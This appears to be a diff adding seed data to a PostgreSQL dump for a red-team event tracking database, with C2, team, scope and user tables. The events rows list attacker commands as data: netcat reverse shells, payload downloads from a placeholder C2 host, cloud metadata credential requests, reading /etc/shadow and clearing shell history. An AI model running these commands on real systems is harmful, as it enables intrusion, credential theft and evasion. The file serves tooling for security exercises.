+846	export HISTCONTROL=ignoredups --tag=570	5	1	4	2026-03-30 22:33:29.548942
+847	base64 /etc/passwd | head -n 5 --tag=316	4	3	4	2026-03-31 05:44:40.467678
+848	docker images --tag=469	5	2	1	2026-03-31 09:16:24.558815
+849	crontab -l --tag=268	2	3	3	2026-03-31 11:11:29.008388
+850	curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ --tag=744	5	3	4	2026-03-31 07:28:24.083975
+851	crontab -l --tag=488	5	3	2	2026-03-31 06:09:27.309826
+852	find / -perm -4000 -type f 2>/dev/null --tag=830	5	4	2	2026-03-30 17:41:16.021847
+853	wget http://c2-server.com/payload.sh -O /tmp/payload.sh --tag=634	3	2	5	2026-03-31 07:58:10.930387
+854	ps -ef --forest --tag=212	3	4	1	2026-03-31 16:01:15.094717
+855	export HISTCONTROL=ignoredups --tag=837	2	1	2	2026-03-30 21:07:36.510951
+856	find / -perm -4000 -type f 2>/dev/null --tag=851	4	3	4	2026-03-31 17:21:11.001565
+857	cat /etc/shadow --tag=96	3	3	2	2026-03-30 20:00:57.073319
+858	cat /etc/shadow --tag=134	6	2	4	2026-03-31 05:00:15.298779
+859	ls -laR /home/ --tag=960	6	4	5	2026-03-30 19:33:42.206451
+860	netstat -antp --tag=516	1	2	4	2026-03-31 10:01:35.281399
+861	tcpdump -i eth0 -c 10 --tag=535	2	4	1	2026-03-30 23:46:56.081977
+863	kubectl get pods --all-namespaces --tag=315	3	1	5	2026-03-31 01:13:20.742085
+864	python3 -c 'import pty; pty.spawn("/bin/bash")' --tag=75	6	2	1	2026-03-31 02:54:16.326447
+865	nc -e /bin/sh 10.0.0.55 4444 --tag=914	5	2	5	2026-03-31 15:48:06.832476
+866	wget http://c2-server.com/payload.sh -O /tmp/payload.sh --tag=473	5	4	5	2026-03-31 09:48:18.606275
+867	whoami /all --tag=776	6	4	3	2026-03-31 05:01:59.759708
+868	nc -e /bin/sh 10.0.0.227 4444 --tag=110	3	2	5	2026-03-31 04:49:36.941832
+869	whoami /all --tag=384	1	1	3	2026-03-31 03:51:08.260553
+870	kubectl get pods --all-namespaces --tag=655	1	4	1	2026-03-31 05:39:05.845266
+871	ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa -N "" --tag=604	5	3	5	2026-03-30 20:03:53.980963
+872	netstat -antp --tag=686	3	2	4	2026-03-30 22:27:46.044333
+873	history -c --tag=658	5	2	1	2026-03-30 21:36:04.473559
+874	docker images --tag=749	4	2	3	2026-03-30 21:53:53.349767
+875	cat /etc/shadow --tag=248	3	2	1	2026-03-31 08:53:52.885272
+876	grep -r "password" /var/www/html/ --tag=215	6	2	1	2026-03-31 06:46:35.606804
+877	crontab -l --tag=297	3	2	3	2026-03-30 18:01:17.827317
+878	find / -perm -4000 -type f 2>/dev/null --tag=246	6	1	5	2026-03-31 03:57:30.854988
+879	base64 /etc/passwd | head -n 5 --tag=221	6	3	3	2026-03-31 13:54:57.132079
+880	base64 /etc/passwd | head -n 5 --tag=280	4	4	4	2026-03-31 10:55:53.315909
+881	crontab -l --tag=738	1	3	5	2026-03-31 15:06:32.340395
+882	grep -r "password" /var/www/html/ --tag=829	1	3	3	2026-03-31 06:48:59.16745
+883	whoami /all --tag=666	3	2	4	2026-03-31 05:49:10.76334
+884	netstat -antp --tag=484	2	3	2	2026-03-31 09:06:43.885563
+885	grep -r "password" /var/www/html/ --tag=904	5	3	2	2026-03-31 12:04:49.137944
+886	nc -e /bin/sh 10.0.0.42 4444 --tag=806	4	4	1	2026-03-31 14:19:24.394402
+887	grep -r "password" /var/www/html/ --tag=646	3	1	4	2026-03-31 11:42:22.31792
+888	export HISTCONTROL=ignoredups --tag=546	1	2	4	2026-03-31 17:04:20.347605
+889	whoami /all --tag=212	1	3	3	2026-03-31 16:02:18.40206
+890	python3 -c 'import pty; pty.spawn("/bin/bash")' --tag=858	2	3	3	2026-03-30 22:28:35.062051
+891	cat /etc/shadow --tag=497	2	1	4	2026-03-31 14:50:19.112127
+892	history -c --tag=30	6	3	4	2026-03-30 18:13:34.020094
+893	python3 -c 'import pty; pty.spawn("/bin/bash")' --tag=958	2	3	4	2026-03-30 17:32:23.464896
+894	ps -ef --forest --tag=174	6	4	1	2026-03-31 09:05:22.423462
+895	ls -laR /home/ --tag=714	5	2	3	2026-03-30 23:41:28.132279
+896	history -c --tag=581	1	1	5	2026-03-31 07:27:09.617414
+897	crontab -l --tag=737	4	2	1	2026-03-30 21:05:15.327048
+898	history -c --tag=611	4	4	4	2026-03-31 12:00:25.08787
+899	kubectl get pods --all-namespaces --tag=781	2	1	3	2026-03-31 00:17:59.223296
+900	cat /etc/shadow --tag=49	4	1	2	2026-03-30 20:31:04.601688
+901	kubectl get pods --all-namespaces --tag=154	1	2	4	2026-03-30 20:58:30.197188
+902	whoami /all --tag=893	5	1	2	2026-03-31 03:14:44.969055
+903	ps -ef --forest --tag=968	2	1	1	2026-03-31 02:18:27.796944
+904	python3 -c 'import pty; pty.spawn("/bin/bash")' --tag=474	6	1	1	2026-03-30 20:36:25.173272
+905	ls -laR /home/ --tag=463	2	3	5	2026-03-31 11:57:41.41448
+906	base64 /etc/passwd | head -n 5 --tag=638	1	2	1	2026-03-30 20:51:18.785786
+907	sudo -l --tag=829	5	2	2	2026-03-31 16:37:01.569014
+908	cat /etc/shadow --tag=140	6	2	5	2026-03-30 20:29:11.94044
+909	export HISTCONTROL=ignoredups --tag=723	1	2	2	2026-03-31 00:11:23.022495
+910	ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa -N "" --tag=699	2	2	3	2026-03-30 19:40:35.131861
+911	ps -ef --forest --tag=398	5	3	3	2026-03-31 16:05:10.87665
+912	tcpdump -i eth0 -c 10 --tag=83	5	4	5	2026-03-30 21:59:20.511617
+913	ls -laR /home/ --tag=43	4	3	3	2026-03-31 14:54:45.712225
+914	crontab -l --tag=164	6	1	2	2026-03-31 05:46:03.596758
+915	python3 -c 'import pty; pty.spawn("/bin/bash")' --tag=604	5	3	1	2026-03-31 15:07:36.268536
+916	grep -r "password" /var/www/html/ --tag=256	5	1	4	2026-03-30 20:45:18.71675
+917	kubectl get pods --all-namespaces --tag=33	3	2	5	2026-03-31 03:28:24.689731
+918	history -c --tag=669	1	3	4	2026-03-30 17:31:54.360305
+919	python3 -c 'import pty; pty.spawn("/bin/bash")' --tag=104	6	4	5	2026-03-30 22:35:30.328835
+920	kubectl get pods --all-namespaces --tag=248	2	4	5	2026-03-30 21:49:28.549703
+921	python3 -c 'import pty; pty.spawn("/bin/bash")' --tag=584	5	4	1	2026-03-31 07:03:09.411894
+922	crontab -l --tag=65	1	4	3	2026-03-31 08:30:12.357083
+923	curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ --tag=595	6	3	5	2026-03-30 20:14:51.975706
+924	wget http://c2-server.com/payload.sh -O /tmp/payload.sh --tag=616	3	3	3	2026-03-30 21:27:39.91102
+925	find / -perm -4000 -type f 2>/dev/null --tag=77	5	3	2	2026-03-31 16:40:56.810362
+926	docker images --tag=250	6	3	1	2026-03-30 17:40:36.104843
+927	ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa -N "" --tag=667	1	2	5	2026-03-31 16:00:33.198353
+928	docker images --tag=903	4	1	2	2026-03-31 07:11:53.017105
+929	ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa -N "" --tag=729	2	2	5	2026-03-31 17:08:10.329961
+930	base64 /etc/passwd | head -n 5 --tag=2	5	1	3	2026-03-31 08:06:26.213278
+931	find / -perm -4000 -type f 2>/dev/null --tag=218	6	2	3	2026-03-31 02:50:54.151663
+932	whoami /all --tag=536	5	3	4	2026-03-31 12:43:41.720646
+933	tcpdump -i eth0 -c 10 --tag=228	1	1	2	2026-03-30 21:28:02.138801
+934	python3 -c 'import pty; pty.spawn("/bin/bash")' --tag=660	5	3	5	2026-03-31 04:56:49.025209
+935	grep -r "password" /var/www/html/ --tag=991	1	2	2	2026-03-31 03:35:39.361586
+936	curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ --tag=896	3	4	1	2026-03-31 02:42:48.557065
+937	netstat -antp --tag=915	4	2	3	2026-03-31 07:11:43.828696
+938	nc -e /bin/sh 10.0.0.26 4444 --tag=582	3	2	4	2026-03-31 06:55:08.298308
+939	base64 /etc/passwd | head -n 5 --tag=205	4	2	3	2026-03-31 12:18:55.398524
+940	ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa -N "" --tag=104	1	4	5	2026-03-30 20:41:52.17426
+941	nc -e /bin/sh 10.0.0.110 4444 --tag=484	6	1	2	2026-03-31 08:25:31.741492
+942	ls -laR /home/ --tag=368	6	1	1	2026-03-30 19:34:44.257406
+943	tcpdump -i eth0 -c 10 --tag=249	3	3	5	2026-03-31 10:07:20.101772
+944	docker images --tag=967	1	3	1	2026-03-31 14:39:48.199599
+945	nc -e /bin/sh 10.0.0.114 4444 --tag=164	2	2	1	2026-03-30 17:41:23.543854
+946	ls -laR /home/ --tag=526	3	2	4	2026-03-31 05:00:20.501735
+947	grep -r "password" /var/www/html/ --tag=56	1	1	3	2026-03-30 22:17:31.057582
+948	whoami /all --tag=728	4	1	5	2026-03-31 07:52:33.114798
+949	ls -laR /home/ --tag=94	4	3	5	2026-03-31 13:12:13.120146
+950	nc -e /bin/sh 10.0.0.158 4444 --tag=339	3	2	4	2026-03-31 03:03:57.449393
+951	ls -laR /home/ --tag=72	1	4	1	2026-03-31 00:22:14.558967
+952	sudo -l --tag=958	6	2	3	2026-03-30 21:59:07.548559
+953	crontab -l --tag=790	4	3	2	2026-03-31 05:59:48.324667
+954	kubectl get pods --all-namespaces --tag=394	2	1	2	2026-03-31 12:59:34.270778
+955	tcpdump -i eth0 -c 10 --tag=362	4	4	1	2026-03-31 04:47:59.327777
+956	ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa -N "" --tag=647	6	3	3	2026-03-31 01:30:11.149666
+957	cat /etc/shadow --tag=389	1	4	5	2026-03-31 09:01:30.547059
+958	kubectl get pods --all-namespaces --tag=64	4	1	3	2026-03-31 13:04:09.135452
+959	grep -r "password" /var/www/html/ --tag=593	3	4	3	2026-03-31 16:14:50.96317
+960	whoami /all --tag=905	4	4	4	2026-03-31 16:19:04.439816
+961	base64 /etc/passwd | head -n 5 --tag=416	5	3	3	2026-03-30 20:30:40.079242
+962	tcpdump -i eth0 -c 10 --tag=471	4	4	2	2026-03-31 08:10:30.82611
+963	find / -perm -4000 -type f 2>/dev/null --tag=280	3	1	5	2026-03-30 23:36:06.752935
+964	base64 /etc/passwd | head -n 5 --tag=578	1	1	2	2026-03-30 20:32:01.400332
+965	grep -r "password" /var/www/html/ --tag=937	5	1	3	2026-03-31 07:35:33.334008
+966	cat /etc/shadow --tag=520	3	1	1	2026-03-31 13:55:29.002048
+967	history -c --tag=706	4	4	3	2026-03-31 01:21:32.649408
+968	ps -ef --forest --tag=167	2	2	2	2026-03-31 02:33:43.982267
+969	tcpdump -i eth0 -c 10 --tag=858	4	4	3	2026-03-30 19:05:11.002618
+970	export HISTCONTROL=ignoredups --tag=272	1	3	3	2026-03-31 02:36:23.461718
+971	netstat -antp --tag=663	3	2	5	2026-03-31 03:12:59.999028
+972	docker images --tag=981	3	1	5	2026-03-31 15:36:15.077937
+973	export HISTCONTROL=ignoredups --tag=400	5	1	5	2026-03-30 17:51:12.997939
+974	find / -perm -4000 -type f 2>/dev/null --tag=3	2	2	2	2026-03-30 20:14:28.429948
+975	tcpdump -i eth0 -c 10 --tag=423	1	1	3	2026-03-30 17:24:14.849235
+976	history -c --tag=164	1	3	4	2026-03-30 18:45:56.162671
+977	kubectl get pods --all-namespaces --tag=770	2	1	3	2026-03-30 22:45:49.316757
+978	wget http://c2-server.com/payload.sh -O /tmp/payload.sh --tag=853	4	2	2	2026-03-31 09:44:31.246952
+979	nc -e /bin/sh 10.0.0.117 4444 --tag=768	6	2	4	2026-03-30 17:41:12.540643
+980	grep -r "password" /var/www/html/ --tag=762	2	2	2	2026-03-30 20:05:48.24745
+981	whoami /all --tag=533	1	3	4	2026-03-31 12:15:42.099406
+982	ls -laR /home/ --tag=213	5	1	5	2026-03-31 10:52:35.573785
+983	crontab -l --tag=282	5	1	2	2026-03-31 00:36:23.171955
+984	history -c --tag=369	5	1	2	2026-03-31 05:09:05.721132
+985	curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ --tag=72	3	1	2	2026-03-30 22:23:29.337892
+986	netstat -antp --tag=296	2	4	1	2026-03-30 21:08:54.67866
+987	ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa -N "" --tag=251	3	1	2	2026-03-30 21:42:46.299006
+988	history -c --tag=456	3	4	1	2026-03-31 12:16:07.378733
+989	sudo -l --tag=4	6	3	4	2026-03-31 01:16:15.310703
+990	export HISTCONTROL=ignoredups --tag=285	3	3	3	2026-03-30 20:45:16.797966
+991	ps -ef --forest --tag=114	2	3	2	2026-03-31 05:52:00.507025
+992	tcpdump -i eth0 -c 10 --tag=162	1	1	1	2026-03-30 18:25:50.604427
+993	ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa -N "" --tag=450	2	1	4	2026-03-30 19:43:48.066019
+994	sudo -l --tag=403	1	4	2	2026-03-30 18:10:57.28644
+995	docker images --tag=406	6	2	1	2026-03-31 03:13:02.457662
+996	wget http://c2-server.com/payload.sh -O /tmp/payload.sh --tag=60	2	1	5	2026-03-30 21:23:42.067852
+997	base64 /etc/passwd | head -n 5 --tag=440	6	3	5	2026-03-31 13:54:38.202044
+998	python3 -c 'import pty; pty.spawn("/bin/bash")' --tag=693	1	2	3	2026-03-30 22:46:05.222624
+999	whoami /all --tag=169	2	1	2	2026-03-30 23:07:24.351804
+1000	ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa -N "" --tag=83	6	4	1	2026-03-31 15:29:33.03832
+1001	export HISTCONTROL=ignoredups --tag=371	4	1	5	2026-03-31 02:49:29.350178
+\.
+
+
+--
+-- Data for Name: scope; Type: TABLE DATA; Schema: lober; Owner: lober
+--
+
+COPY lober.scope (id, name) FROM stdin;
+1	box-1
+2	box-2
+3	box-3
+4	box-4
+5	box-5
+\.
+
+
+--
+-- Data for Name: teams; Type: TABLE DATA; Schema: lober; Owner: lober
+--
+
+COPY lober.teams (id, name, color) FROM stdin;
+1	default	
+2	linux	a0ffff
+3	windows	ffa0ff
+4	firewall	ffffa0
+\.
+
+
+--
+-- Data for Name: tokens; Type: TABLE DATA; Schema: lober; Owner: lober
+--
+
+COPY lober.tokens (id, token, user_id, c2_id, created, expires) FROM stdin;
+\.
+
+
+--
+-- Data for Name: users; Type: TABLE DATA; Schema: lober; Owner: lober
+--
+
+COPY lober.users (id, username, password, team_id) FROM stdin;
+1	admin	$2a$10$/3veo6ylXGuY112z1kTW7.qi4SN5EBMQRT6xO95MGmcMPLGiAofVC	1
+2	knights	$2a$10$A.XxWyuEqjRTkksHCZmo3uXqsdaG5OqC6/AKE8t8IHeAx9NzLDHYG	2
+3	james	$2a$10$FvADSSKIUyrBItbC/mNrCO1F7BmHCAo1pu0VPKU01Gm6ocQqMXhT6	1
+4	max	$2a$10$4yo4NmzWbm6lyFMLbxmpIOk5T/VK0uxr7vYo0/nNeQ3KyzyuGHN2q	2
+5	joe	$2a$10$1DQqlbz/rihzkytu/4c.8upvaEBBjNWnxEd7RAXHo2HL9KdJwbXR2	4
+6	mubix	$2a$10$iAZfiT7irGwxKGn8xVa5xuRpf.VDnAozJSv/S6rk.23d7l9598Uou	3
+\.
+
+
+--
+-- Name: c2s_id_seq; Type: SEQUENCE SET; Schema: lober; Owner: lober
+--
+
+SELECT pg_catalog.setval('lober.c2s_id_seq', 4, true);
+
+
+--
+-- Name: events_c2_id_seq; Type: SEQUENCE SET; Schema: lober; Owner: lober
+--
+
+SELECT pg_catalog.setval('lober.events_c2_id_seq', 1, false);
+
+
+--
+-- Name: events_id_seq; Type: SEQUENCE SET; Schema: lober; Owner: lober
+--
+
+SELECT pg_catalog.setval('lober.events_id_seq', 1001, true);
+
+
+--
+-- Name: events_scope_id_seq; Type: SEQUENCE SET; Schema: lober; Owner: lober
+--
+
+SELECT pg_catalog.setval('lober.events_scope_id_seq', 1, false);
+
+
+--
+-- Name: events_user_id_seq; Type: SEQUENCE SET; Schema: lober; Owner: lober
+--
+
+SELECT pg_catalog.setval('lober.events_user_id_seq', 1, false);
+
+
+--
+-- Name: scope_id_seq; Type: SEQUENCE SET; Schema: lober; Owner: lober
+--
+
+SELECT pg_catalog.setval('lober.scope_id_seq', 5, true);
+
+
+--
+-- Name: teams_id_seq; Type: SEQUENCE SET; Schema: lober; Owner: lober
+--
+
+SELECT pg_catalog.setval('lober.teams_id_seq', 4, true);
+
+
+--
+-- Name: tokens_c2_id_seq; Type: SEQUENCE SET; Schema: lober; Owner: lober
+--
+
+SELECT pg_catalog.setval('lober.tokens_c2_id_seq', 1, false);
+
+
+--
+-- Name: tokens_id_seq; Type: SEQUENCE SET; Schema: lober; Owner: lober
+--
+
+SELECT pg_catalog.setval('lober.tokens_id_seq', 1, false);
+
+
+--
+-- Name: tokens_user_id_seq; Type: SEQUENCE SET; Schema: lober; Owner: lober
+--
+
+SELECT pg_catalog.setval('lober.tokens_user_id_seq', 1, false);
+
+
+--
+-- Name: users_id_seq; Type: SEQUENCE SET; Schema: lober; Owner: lober
+--
+
+SELECT pg_catalog.setval('lober.users_id_seq', 6, true);
+
+
+--
+-- Name: users_team_id_seq; Type: SEQUENCE SET; Schema: lober; Owner: lober
+--
+
+SELECT pg_catalog.setval('lober.users_team_id_seq', 1, false);
+
+
+--
+-- Name: c2s c2s_name_key; Type: CONSTRAINT; Schema: lober; Owner: lober
+--
+
+ALTER TABLE ONLY lober.c2s
+    ADD CONSTRAINT c2s_name_key UNIQUE (name);
+
+
+--
+-- Name: c2s c2s_pkey; Type: CONSTRAINT; Schema: lober; Owner: lober
+--
+
+ALTER TABLE ONLY lober.c2s
+    ADD CONSTRAINT c2s_pkey PRIMARY KEY (id);
+
+
+--
+-- Name: events events_pkey; Type: CONSTRAINT; Schema: lober; Owner: lober
+--
+
+ALTER TABLE ONLY lober.events
+    ADD CONSTRAINT events_pkey PRIMARY KEY (id);
+
+
+--
+-- Name: scope scope_name_key; Type: CONSTRAINT; Schema: lober; Owner: lober
+--
+
+ALTER TABLE ONLY lober.scope
+    ADD CONSTRAINT scope_name_key UNIQUE (name);
+
+
+--
+-- Name: scope scope_pkey; Type: CONSTRAINT; Schema: lober; Owner: lober
+--
+
+ALTER TABLE ONLY lober.scope
+    ADD CONSTRAINT scope_pkey PRIMARY KEY (id);
+
+
+--
+-- Name: teams teams_name_key; Type: CONSTRAINT; Schema: lober; Owner: lober
+--
+
+ALTER TABLE ONLY lober.teams
+    ADD CONSTRAINT teams_name_key UNIQUE (name);
+
+
+--
+-- Name: teams teams_pkey; Type: CONSTRAINT; Schema: lober; Owner: lober
+--
+
+ALTER TABLE ONLY lober.teams
+    ADD CONSTRAINT teams_pkey PRIMARY KEY (id);
+
+
+--
+-- Name: tokens tokens_pkey; Type: CONSTRAINT; Schema: lober; Owner: lober
+--
+
+ALTER TABLE ONLY lober.tokens
+    ADD CONSTRAINT tokens_pkey PRIMARY KEY (id);
+
+
+--
+-- Name: tokens tokens_token_key; Type: CONSTRAINT; Schema: lober; Owner: lober
+--
+
+ALTER TABLE ONLY lober.tokens
+    ADD CONSTRAINT tokens_token_key UNIQUE (token);
+
+
+--
+-- Name: users users_pkey; Type: CONSTRAINT; Schema: lober; Owner: lober
+--
+
+ALTER TABLE ONLY lober.users
+    ADD CONSTRAINT users_pkey PRIMARY KEY (id);
+
+
+--
+-- Name: users users_username_key; Type: CONSTRAINT; Schema: lober; Owner: lober
+--
+
+ALTER TABLE ONLY lober.users
+    ADD CONSTRAINT users_username_key UNIQUE (username);
+
+
+--
+-- Name: events events_c2_id_fkey; Type: FK CONSTRAINT; Schema: lober; Owner: lober
+--
+
+ALTER TABLE ONLY lober.events
+    ADD CONSTRAINT events_c2_id_fkey FOREIGN KEY (c2_id) REFERENCES lober.c2s(id);
+
+
+--
+-- Name: events events_scope_id_fkey; Type: FK CONSTRAINT; Schema: lober; Owner: lober
+--
+
+ALTER TABLE ONLY lober.events
+    ADD CONSTRAINT events_scope_id_fkey FOREIGN KEY (scope_id) REFERENCES lober.scope(id);
+
+
+--
+-- Name: events events_user_id_fkey; Type: FK CONSTRAINT; Schema: lober; Owner: lober
+--
+
+ALTER TABLE ONLY lober.events
+    ADD CONSTRAINT events_user_id_fkey FOREIGN KEY (user_id) REFERENCES lober.users(id);
+
+
+--
+-- Name: tokens tokens_c2_id_fkey; Type: FK CONSTRAINT; Schema: lober; Owner: lober
+--
+
+ALTER TABLE ONLY lober.tokens
+    ADD CONSTRAINT tokens_c2_id_fkey FOREIGN KEY (c2_id) REFERENCES lober.c2s(id);
+
+
+--
+-- Name: tokens tokens_user_id_fkey; Type: FK CONSTRAINT; Schema: lober; Owner: lober
+--
+
+ALTER TABLE ONLY lober.tokens
+    ADD CONSTRAINT tokens_user_id_fkey FOREIGN KEY (user_id) REFERENCES lober.users(id);
+
+
+--
+-- Name: users users_team_id_fkey; Type: FK CONSTRAINT; Schema: lober; Owner: lober
+--
+
+ALTER TABLE ONLY lober.users
+    ADD CONSTRAINT users_team_id_fkey FOREIGN KEY (team_id) REFERENCES lober.teams(id);
+
+
+--
+-- PostgreSQL database dump complete
+--
+
+\unrestrict DTgP19zeYFkLWFoh9HxtXPojt8OEMaeeJdf4APrawLovw3Me9Ho9TLcZty6csXN
+
